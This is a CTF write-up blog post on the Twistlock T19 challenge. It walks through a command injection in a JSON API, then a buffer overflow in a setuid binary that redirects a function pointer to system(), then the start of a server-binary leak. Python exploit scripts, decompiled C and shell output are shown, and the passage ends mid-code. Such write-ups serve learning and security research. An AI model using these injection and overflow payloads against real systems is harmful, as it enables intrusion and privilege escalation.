<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>The T19 challenge | kileak</title>





<meta name="description" content="The T19 challenge">


<meta name="keywords" content="t19">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2019/T19Challenge/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">The T19 challenge</h1>
      <p class="post-meta">Jan 18, 2019</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>Our company developed a unique Linux binary called “cat”. 
<!--break--></p>

  <p>We recently discovered that our competitors from the Antivirus company VirusExpress are blocking our cat 
binary. It is now signed as a virus. Word is that you are a badass security researcher. We need you to infilitrate their server and empty their database. 
Download cat</p>

  <p>kileak score: <code class="language-plaintext highlighter-rouge">0xffff/0xfff</code></p>

  <p>You won!
You badass researcher. To collect your T19 challenge coin, please send the flags in an email to ctf@twistlock.com 
Good job!</p>

  <p>Set the same cookie (t19userid) for the target and attack: Virus.Express</p>

</blockquote>

<p>Stumbled over the T19 challenge from <a href="http://t19challenge.com/">Twistlock</a> last week and really enjoyed it, so I decided to do a writeup for the trip through the “official” challenges and also for getting the hidden flag.</p>

<h2 id="challenge-1-get-started-with-the-json-api-and-get-access-to-the-remote-server">Challenge 1: Get started with the json api and get access to the remote server</h2>

<blockquote>
  <p>Attachment: <a href="https://kileak.github.io/assets/t19/l1/xpl1.py">xpl1.py</a></p>
</blockquote>

<p>We were given a user cookie and the virus express page as our target.</p>

<p>Setting the cookie as described in the challenge, gets us to the virus express web interface.</p>

<p><img src="/assets/t19/virus_express_page.png" alt="Virus Express" /></p>

<p>We can upload a file there, for example the provided <code class="language-plaintext highlighter-rouge">cat</code> file, which will be shown as a virus. Though, not much to do with this functionality for now, but the source of the page points us to the next step.</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="c">&lt;!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ --&gt;</span>
<span class="c">&lt;!-- Developer TODO: 1. Need more clouds for malware scanning 2. Add documentation on the experimental JSON API on /api --&gt;</span>
<span class="c">&lt;!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ --&gt;</span></code></pre></figure>

<p>So it seems there’s a backend service, with which we can communicate through <code class="language-plaintext highlighter-rouge">/api</code>. Since I didn’t want to bother too much with that api through a browser, I set up a short python script for this, also being more flexible on later steps.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">BASEURL</span> <span class="o">=</span> <span class="s">"http://virus.express/api"</span>

<span class="n">SESSION</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">COOKIE</span> <span class="o">=</span> <span class="p">{</span><span class="s">"t19userid"</span><span class="p">:</span><span class="s">"560f5a93abc5e6439c60ad3725e6556b"</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">Post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">SESSION</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="n">url</span><span class="p">),</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">COOKIE</span><span class="p">).</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">inp</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">()</span>
        <span class="k">print</span> <span class="n">Post</span><span class="p">(</span><span class="n">BASEURL</span><span class="p">,</span> <span class="n">inp</span><span class="p">)</span>

    <span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">exploit</span><span class="p">()</span></code></pre></figure>

<p>Armed with this, we can try to explore the api and find out more about its usage, since no info about it was available at that point.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl_ex1.py 
abc
{"success":false,"response":"Please deliver JSON application only."}</code></pre></figure>

<p>Ok, so it expects <code class="language-plaintext highlighter-rouge">application/json</code> data.</p>

<p>Let’s update the session header accordingly</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">SESSION</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">update</span><span class="p">({</span> <span class="s">"Content-Type"</span> <span class="p">:</span> <span class="s">"application/json"</span><span class="p">})</span></code></pre></figure>

<p>Trying it again will now result in an error page, since the application wasn’t able to parse our input, giving us some additional information.</p>

<p><img src="/assets/t19/virus_express_parse_error.png" alt="Virus Express parse error" /></p>

<p>From line 52 we can work out, how the input json has to be built up:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">{
  "file" : 
  {
    "hash" : "hash", 
    "name": "filename" 
  },
  "cmd" : "command"
}</code></pre></figure>

<p>Updating the script to send proper json payloads to the service:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">execute_cmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">js</span> <span class="o">=</span> 
    <span class="p">{</span> 
        <span class="s">"file"</span> <span class="p">:</span> 
        <span class="p">{</span>
            <span class="s">"hash"</span> <span class="p">:</span> <span class="s">"abc"</span><span class="p">,</span> 
            <span class="s">"name"</span><span class="p">:</span> <span class="s">"filename"</span> 
        <span class="p">},</span>
        <span class="s">"cmd"</span> <span class="p">:</span> <span class="n">cmd</span>
    <span class="p">}</span>
  
    <span class="k">print</span> <span class="n">Post</span><span class="p">(</span><span class="n">BASEURL</span><span class="p">,</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">js</span><span class="p">))</span></code></pre></figure>

<p>With this, we’ll get through the parsing, but end up with another error, this time in the <code class="language-plaintext highlighter-rouge">is_virus</code> function.</p>

<p><img src="/assets/t19/virus_express_parse_error2.png" alt="Virus Express Parse Error2" /></p>

<p>Ok, the hash length has to be divisible by 4, and if no <code class="language-plaintext highlighter-rouge">cmd</code> is specified, <code class="language-plaintext highlighter-rouge">/home/ben/dbclient</code> will be executed, which probably compares the hashes to the internal “database”, but what’s more interesting is line 8:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">`#{cmd} "#{encoded}" "#{filename}"`</code></pre></figure>

<p>Easy command injection :)</p>

<p>So, if we define a valid hash, we can execute any command as the user, which is running the script on serverside.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="err">$</span> <span class="n">python</span> <span class="n">xpl_ex1</span><span class="p">.</span><span class="n">py</span>

<span class="nb">id</span>
<span class="p">{</span><span class="s">"success"</span><span class="p">:</span><span class="n">true</span><span class="p">,</span><span class="s">"response"</span><span class="p">:</span><span class="s">"uid=1000(rubyist) gid=1000(rubyist) groups=1000(rubyist)</span><span class="se">\n</span><span class="s">"</span><span class="p">}</span>

<span class="n">ls</span> <span class="o">-</span><span class="n">al</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rubyist</span>
<span class="p">{</span><span class="s">"success"</span><span class="p">:</span><span class="n">true</span><span class="p">,</span><span class="s">"response"</span><span class="p">:</span><span class="s">"
total 40 
drwxr-xr-x 1 rubyist rubyist 4096 Dec 26 15:26 . 
drwxr-xr-x 1 root root 4096 Dec 26 15:26 .. 
-rw-r--r-- 1 rubyist rubyist 220 May 15 2017 .bash_logout 
-rw-r--r-- 1 rubyist rubyist 3526 May 15 2017 .bashrc 
-r----S--- 1 rubyist rubyist 33 Dec 17 13:24 .flag.apprentice 
-rw-r--r-- 1 rubyist rubyist 675 May 15 2017 .profile 
lrwxrwxrwx 1 rubyist rubyist 18 Dec 26 15:26 dbclient -&gt; /home/ben/dbclient 
-rwxrwxr-x 1 rubyist rubyist 1297 Dec 26 12:48 http.rb 
-rw-rw-r-- 1 rubyist rubyist 259 Dec 18 13:23 plug.rb 
drwxrwxr-x 2 rubyist rubyist 4096 Dec 20 10:56 views 
w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL </span><span class="se">\n</span><span class="s">"</span><span class="p">}</span>

<span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">rubyist</span><span class="o">/</span><span class="p">.</span><span class="n">flag</span><span class="p">.</span><span class="n">apprentice</span>
<span class="p">{</span><span class="s">"success"</span><span class="p">:</span><span class="n">true</span><span class="p">,</span><span class="s">"response"</span><span class="p">:</span><span class="s">"flag{nice____________________gg} w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL </span><span class="se">\n</span><span class="s">"</span><span class="p">}</span></code></pre></figure>

<p>Ok, that wasn’t too bad, and got us the first flag. After dropping it on the challenge page, the next assignment is to leak the <code class="language-plaintext highlighter-rouge">dbclient</code>.</p>

<h2 id="challenge-2--leaking-dbclient-and-get-access-to-user-ben">Challenge 2 : Leaking dbclient and get access to user ben</h2>

<blockquote>
  <p>Attachment: <a href="https://kileak.github.io/assets/t19/l2/dbclient">dbclient</a> <a href="https://kileak.github.io/assets/t19/l2/xpl2.py">xpl2.py</a></p>
</blockquote>

<p>Since we now have kind of a shell to the system, we won’t have to mess around with web stuff anymore. Leaking <code class="language-plaintext highlighter-rouge">dbclient</code> is pretty forward, just <code class="language-plaintext highlighter-rouge">cat</code> it, <code class="language-plaintext highlighter-rouge">base64</code> encode it and decode it again locally.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">leak_dbclient</span><span class="p">():</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">execute_cmd</span><span class="p">(</span><span class="s">"cat /home/rubyist/dbclient | base64"</span><span class="p">)</span>
  
    <span class="n">response</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">","</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
  
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"dbclient"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">response</span><span class="p">))</span></code></pre></figure>

<p>Finally a binary to work with, things start to get interesting. Note, that the <code class="language-plaintext highlighter-rouge">dbclient</code> runs as setuid and belongs to the user <code class="language-plaintext highlighter-rouge">ben</code>. So exploiting it, will give us access to the <code class="language-plaintext highlighter-rouge">ben</code> user.</p>

<p>But first, let’s see how the binary works, and what we could do with it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">hashfunc_ptr</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">server_response</span><span class="p">;</span>
  
    <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">ping_server</span><span class="p">()</span> <span class="p">)</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"client: server is live."</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"client: server is bad."</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">validate_arg1</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">)</span>
        <span class="p">{</span>
            <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>       <span class="c1">// Buffer overflow possible</span>
            <span class="n">hashfuncptr</span> <span class="o">&amp;=</span> <span class="n">hash_func</span><span class="p">;</span>     <span class="c1">// Strange way of assigning a function pointer ;)</span>

            <span class="n">ptr</span> <span class="o">=</span> <span class="n">hashfunc_ptr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span> <span class="p">)</span>
            <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span> <span class="n">ask_server_if_virus</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">server_response</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
                <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span> <span class="n">server_response</span> <span class="p">)</span>
                        <span class="n">printf</span><span class="p">(</span><span class="s">"true"</span><span class="p">);</span>
                    <span class="k">else</span>
                        <span class="n">printf</span><span class="p">(</span><span class="s">"false"</span><span class="p">);</span>

                    <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">else</span>
                <span class="p">{</span>
                    <span class="n">fwrite</span><span class="p">(</span><span class="s">"client server communication failed</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="n">fwrite</span><span class="p">(</span><span class="s">"client hash failed</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">fwrite</span><span class="p">(</span><span class="s">"client bad hash</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">fwrite</span><span class="p">(</span><span class="s">"client [hash] [filename]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="mh">0x19uLL</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
        <span class="n">result</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Though I reversed the complete binary at this point already, understanding how the protocol works and the client communicates with the server isn’t needed for stage 2, so let’s ignore it for now.</p>

<p>There’s an obvious buffer overflow in handling the arguments, which can be used to overwrite the <code class="language-plaintext highlighter-rouge">hashfuncptr</code>. Since the binary uses a bit-and for “assigning” the <code class="language-plaintext highlighter-rouge">hash_func</code>, we’re able to forge the <code class="language-plaintext highlighter-rouge">hashfuncptr</code> to call an almost arbitrary address in the binary instead (which conveniently will get our input as parameter).</p>

<p>Seeing that the binary contains <code class="language-plaintext highlighter-rouge">__libc_system.plt</code>, this is an easy target to get code execution. We can overflow <code class="language-plaintext highlighter-rouge">dest</code> to overwrite <code class="language-plaintext highlighter-rouge">hashfuncptr</code>, which should then get <code class="language-plaintext highlighter-rouge">and</code>ed, which results in pointing to <code class="language-plaintext highlighter-rouge">__libc_system.plt</code>.</p>

<p>Only one small obstacle left to overcome:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">HASH_CHARSET</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&amp;&lt;&gt;()[]{}@%$#"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">validate_arg1</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">arg1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">valid</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">%</span> <span class="mi">5</span> <span class="p">)</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">valid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

      <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">84</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
      <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">arg1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">HASH_CHARSET</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>  <span class="c1">// check for valid charset</span>
          <span class="p">{</span>
              <span class="n">valid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
              <span class="k">break</span><span class="p">;</span>
          <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">valid</span> <span class="p">)</span>                      <span class="c1">// no valid character found</span>
          <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>This means our complete payload must consist only of characters from <code class="language-plaintext highlighter-rouge">HASH_CHARSET</code>. Thus we cannot just <code class="language-plaintext highlighter-rouge">and</code> the address of <code class="language-plaintext highlighter-rouge">__libc_system.plt</code> but have to find some other chars from this charset to result in the same value.</p>

<p>Another issue is, that we are not allowed to use any whitespaces, which constraints us in the commands, we’ll be able to execute with <code class="language-plaintext highlighter-rouge">system</code> later on. I got around this by preparing a script in <code class="language-plaintext highlighter-rouge">/tmp</code> with the command execution from stage 1 and then just execute this script via <code class="language-plaintext highlighter-rouge">dbclient</code> (which will then be run as <code class="language-plaintext highlighter-rouge">ben</code>, since it’s setuid).</p>

<p>For overwriting <code class="language-plaintext highlighter-rouge">hashfunc_ptr</code>, we can just use <code class="language-plaintext highlighter-rouge">0x4141414141432a68</code> consisting only of valid chars (and will result in <code class="language-plaintext highlighter-rouge">0x400a60</code>).</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">execute_as_ben</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">"/tmp/s&amp;&amp;"</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"#"</span><span class="o">*</span><span class="p">(</span><span class="mi">48</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141432a68</span><span class="p">)</span>  <span class="c1"># hashfunc_ptr
</span>    <span class="n">payload</span>  <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>   <span class="c1"># align to be divisble by 4
</span>
    <span class="n">execute_cmd</span><span class="p">(</span><span class="s">'echo "#/bin/sh</span><span class="se">\n</span><span class="s">%s" &gt; /tmp/s'</span> <span class="o">%</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="n">execute_cmd</span><span class="p">(</span><span class="s">"chmod +x /tmp/s"</span><span class="p">)</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">execute_cmd</span><span class="p">(</span><span class="s">'/home/ben/dbclient "%s" abc'</span> <span class="o">%</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">execute_cmd</span><span class="p">(</span><span class="s">"rm /tmp/s"</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">response</span>
<span class="p">...</span>
<span class="n">execute_as_ben</span><span class="p">(</span><span class="s">"cat /home/ben/.flag.advanced"</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"flag{welcomeh0me...$$$} w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}
{"success":true,"response":"w?#eIgb9iEwIMkPgbroGh!s)Sg=w/6i5@@Lg?wBL \n"}</code></pre></figure>

<p>Ok, second flag done, on to the next assignment. This time, they ask us to “delete” the database of virus express.</p>

<h2 id="challenge-3--leak-server-binary-and-exploit-it-to-delete-the-database">Challenge 3 : Leak server binary and exploit it to delete the database</h2>

<blockquote>
  <p>Attachment: <a href="https://kileak.github.io/assets/t19/l3/srv_copy">srv_copy</a> <a href="https://kileak.github.io/assets/t19/l3/libc.so.6">libc.so.6</a> <a href="https://kileak.github.io/assets/t19/l3/xpl_client.c">xpl_client.c</a> <a href="https://kileak.github.io/assets/t19/l3/xpl3.py">xpl3.py</a></p>
</blockquote>

<p>First, we’ll need to leak the server binary. Fortunately <code class="language-plaintext highlighter-rouge">ben</code> has a copy from it, though it’s only readable by him.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">&gt; ls -al /home/ben

total 60 
drwxr-xr-x 1 ben ben 4096 Jan 15 16:19 .
drwxr-xr-x 1 root root 4096 Dec 26 15:26 ..
-rw-r--r-- 1 ben ben 220 May 15 2017 .bash_logout
-rw-r--r-- 1 ben ben 3526 May 15 2017 .bashrc
-r----S--- 1 ben ben 24 Nov 29 15:00 .flag.advanced
-rw-r--r-- 1 ben ben 675 May 15 2017 .profile
-rws---r-x 1 ben ben 14872 Dec 17 18:01 dbclient
-r-------- 1 ben ben 14552 Jan 15 16:19 srv_copy</code></pre></figure>

<p>Well, we already have code execution as user <code class="language-plaintext highlighter-rouge">ben</code>, so we can do something similar to stage2, just this time, we’ll be reading it with our second exploit through <code class="language-plaintext highlighter-rouge">dbclient</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">leak_srv</span><span class="p">():</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">execute_as_ben</span><span class="p">(</span><span class="s">"cat /home/ben/srv_copy | base64"</span><span class="p">)</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">","</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"srv_copy"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">response</span><span class="p">))</span></code></pre></figure>

<p>While at it, I also leaked libc from the remote system to get a better idea of the setup (this can be done with the stage 1 exploit, since it’s readable by everyone).</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">GNU C Library (Debian GLIBC 2.24-11+deb9u3) stable release version 2.24, by Roland McGrath et al.</code></pre></figure>

<p>From stage 2 I already had a good idea of the protocol used in communication between client and server, which is now needed for stage 3.</p>

<p>We’ll be building our own client to have more control over the packages, which will be sent to the server.</p>

<p>Let’s start with the package structure itself. For this we can take a look at how the client sends a request package to the server.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">send_to_socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">socketfd</span><span class="p">,</span> <span class="kt">char</span> <span class="n">action</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">payload</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">269</span><span class="p">];</span>
  
    <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10DuLL</span><span class="p">);</span>

    <span class="c1">// Set package action</span>
    <span class="n">s</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="n">action</span><span class="p">;</span>

    <span class="c1">// Write package header</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37374144</span><span class="p">;</span>
    <span class="n">s</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">payload</span> <span class="p">)</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="mi">14</span><span class="p">],</span> <span class="n">payload</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
  
    <span class="c1">// Create checksum and write into package start</span>
    <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">adler32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">=</span> <span class="n">adler32</span><span class="p">(</span><span class="n">res</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x10D</span><span class="p">);</span>

    <span class="c1">// Send package to server</span>
